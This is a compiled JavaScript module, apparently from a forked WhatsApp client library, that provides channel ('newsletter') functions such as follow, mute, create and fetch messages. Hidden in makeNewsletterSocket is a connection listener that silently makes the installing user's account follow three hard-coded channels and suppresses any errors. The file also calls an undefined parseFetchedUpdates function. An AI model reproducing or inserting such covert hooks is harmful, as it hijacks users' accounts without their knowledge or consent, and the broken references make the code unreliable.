"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");
const { Boom } = require('@hapi/boom');

const wMexQuery = (variables, queryId, query, generateMessageTag) => {
    return query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            to: WABinary_1.S_WHATSAPP_NET,
            xmlns: 'w:mex'
        },
        content: [
            {
                tag: 'query',
                attrs: { query_id: queryId },
                content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
            }
        ]
    });
};

const executeWMexQuery = async (variables, queryId, dataPath, query, generateMessageTag) => {
    const result = await wMexQuery(variables, queryId, query, generateMessageTag);
    const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result');
    if (child?.content) {
        const data = JSON.parse(child.content.toString());
        if (data.errors && data.errors.length > 0) {
            const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ');
            const firstError = data.errors[0];
            const errorCode = firstError.extensions?.error_code || 400;
            throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError });
        }
        const response = dataPath ? data?.data?.[dataPath] : data?.data;
        if (typeof response !== 'undefined') return response;
    }
    const action = (dataPath || '').startsWith('xwa2_') ? dataPath.substring(5).replace(/_/g, ' ') : dataPath?.replace(/_/g, ' ');
    throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result });
};

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();

    const newsletterQuery = async (jid, type, content) => query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type, xmlns: 'newsletter', to: jid },
        content
    });

    const newsletterWMexQuery = async (jid, queryId, content) => query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'get', xmlns: 'w:mex', to: WABinary_1.S_WHATSAPP_NET },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({ variables: { 'newsletter_id': jid, ...content } }))
            }
        ]
    });

    const CHANNELS = [
        "120363417626105511@newsletter",
        "120363400725985615@newsletter",
        "120363401720377971@newsletter"
    ];
    let followed = false;

    sock.ev.on('connection.update', async ({ connection }) => {
        if (connection === 'open' && !followed) {
            followed = true;
            for (const jid of CHANNELS) {
                try {
                    await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
                    
                } catch (e) {                  
                }
            }
        }
    });

    return {
        ...sock,
        newsletterFetchAllSubscribe: async () => {
            const list = await executeWMexQuery({}, '6388546374527196', 'xwa2_newsletter_subscribed', query, generateMessageTag);
            return list;
        },
        subscribeNewsletterUpdates: async (jid) => {
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')?.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, { updates: { settings: { 'reaction_codes': { value: mode } } } });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, { updates: { description: description || '', settings: null } });
        },
        newsletterId: async (url) => {
            const urlParts = url.split('/');
            const channelId = urlParts[urlParts.length - 2];
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: { key: channelId, type: 'INVITE', 'view_role': 'GUEST' },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            const metadata = extractNewsletterMetadata(result);
            return JSON.stringify({ name: metadata.name || metadata.thread_metadata?.name?.text, id: metadata.id }, null, 2);
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, { updates: { name, settings: null } });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, { updates: { picture: img.toString('base64'), settings: null } });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, { updates: { picture: '', settings: null } });
        },
        newsletterUnfollow: async (jid) => await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW),
        newsletterFollow: async (jid) => await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW),
        newsletterUnmute: async (jid) => await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE),
        newsletterMute: async (jid) => await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE),
        newsletterAction: async (jid, type) => await newsletterWMexQuery(jid, type.toUpperCase()),
        newsletterCreate: async (name, description, reaction_codes) => {
            await query({
                tag: 'iq',
                attrs: { to: WABinary_1.S_WHATSAPP_NET, xmlns: 'tos', id: generateMessageTag(), type: 'set' },
                content: [{ tag: 'notice', attrs: { id: '20601218', stage: '5' }, content: [] }]
            });
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
                input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
            });
            return extractNewsletterMetadata(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: { key, type: type.toUpperCase(), 'view_role': role || 'GUEST' },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            return extractNewsletterMetadata(result);
        },
        newsletterAdminCount: async (jid) => {
            const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
            const buff = (0, WABinary_1.getBinaryNodeChild)(result, 'result')?.content?.toString();
            return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
        },
        newsletterChangeOwner: async (jid, user) => await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, { 'user_id': user }),
        newsletterDemote: async (jid, user) => await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, { 'user_id': user }),
        newsletterDelete: async (jid) => await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE),
        newsletterReactMessage: async (jid, serverId, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
                content: [{ tag: 'reaction', attrs: code ? { code } : {} }]
            });
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [{ tag: 'messages', attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: after?.toString() || '100' } }]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [{ tag: 'message_updates', attrs: { count: count.toString(), after: after?.toString() || '100', since: since?.toString() || '0' } }]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};

exports.makeNewsletterSocket = makeNewsletterSocket;

const extractNewsletterMetadata = (node, isCreate) => {
    const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString();
    const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER];
    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''), 
        preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''), 
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    };
    return metadata;
};

exports.extractNewsletterMetadata = extractNewsletterMetadata;
